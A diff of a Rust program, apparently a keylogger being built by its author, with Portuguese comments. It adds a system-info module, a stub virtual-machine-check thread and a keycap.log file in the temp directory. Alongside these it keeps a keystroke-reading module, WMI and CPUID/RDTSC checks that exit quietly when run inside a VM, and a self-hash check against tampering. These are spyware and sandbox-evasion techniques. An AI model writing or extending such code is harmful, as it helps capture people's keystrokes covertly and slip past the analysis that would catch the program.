@@ -1,55 +1,22 @@
 use std::fs::OpenOptions;
-//use std::thread;
-//use std::time::Duration;
-//use chrono::{format, prelude::*};
-use std::io::Write;
-use std::fs::File;
 use std::collections::HashMap;
 use wmi::{COMLibrary, WMIConnection, WMIResult, Variant};
 use sha2::{Sha256, Digest};
 use core::arch::x86_64::{__cpuid, _rdtsc};
+
+mod getinfo;
 mod leitura_tecla;
+
+
+use std::thread;
 
 // precisa mudar dps para o hash da func depois de pronta
 const EXPECTED: [u8;32] = [0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56];
 
-// macro de erro
-macro_rules! error {
-    ($msg:expr, $($arg:expr), *) => {
-        println!("[!] {}", format!($msg,$($arg),*))
-    };
-}
+
 // ainda vou fazer um codigo caso esteja em uma vm, para rodar uma coisa legit
 fn legit(){std::process::exit(1)}
 
-fn info_basica(file: &mut File){
-    // aq estou pegando as informações do sistema, como verssao, o tipo de sistema e entre outros.
-    let info_so = {
-        let info = os_info::get();
-        format!("OS: {}\nVerssão: {}\n", info.os_type(), info.version())
-    };
-
-    log(file, info_so);
-
-    let hostname_wrap = hostname::get();
-
-    if hostname_wrap.is_ok(){log(file, format!("Hostname: {:?}\n",hostname_wrap.unwrap()))}
-    
-    else {log(file, format!("Hostname: Erro"));}
-
-}
-
-fn log(file: &mut File, s:String){
-    match file.write(s.as_bytes()){
-        Err(err) => error!("Não foi possivel escrever no arquivo erro= {}", err),
-        _ => {},
-    }
-
-    match file.flush(){
-        Err(err) => {error!("Erro a dar flush para escrever no arquivo erro= {}",err)},
-        _=> {}
-    }
-}
 
 // fn() é um function pointer (ponteiro de função)
 // isso não executa a função.
@@ -86,13 +53,20 @@ fn hash_protected_region() -> Vec<u8> {
         std::slice::from_raw_parts(start as *const u8, size)
     };
 
-    // intancia...
+    // intanci
     let mut hasher = Sha256::new();
     hasher.update(bytes);
     let hash = hasher.finalize().to_vec(); 
+    // depois eu tiro isso, só para eu salvar o hash
     println!("{:?}",&hash);
     hash
 }
+
+
+fn check_vm_thread() {
+    println!("teste")
+}
+
 //Impede o compilador de, remover, mover
 #[inline(never)]
 //Impede renomeação do símbolo, garante que exista endereço fixo na .text
@@ -118,6 +92,7 @@ fn check_vm() -> WMIResult<()>{
 #[unsafe(no_mangle)] // garante que o símbolo exista no binário.
 pub fn integrity_end() {}
 
+
 fn verify_function_integrity() {
     let current = hash_protected_region();
 
@@ -129,6 +104,9 @@ fn verify_function_integrity() {
 
 fn main() {
     
+    let handle = thread::spawn(check_vm_thread);
+    handle.join().unwrap();
+
     let temp_path = std::env::temp_dir();
     let filename = temp_path.join("keycap.log");
 
@@ -138,6 +116,6 @@ fn main() {
         .open(filename)
         .expect("erro ao criar arquivo");
 
-    info_basica(&mut output);
+    getinfo::info_basica(&mut output);
     
 }
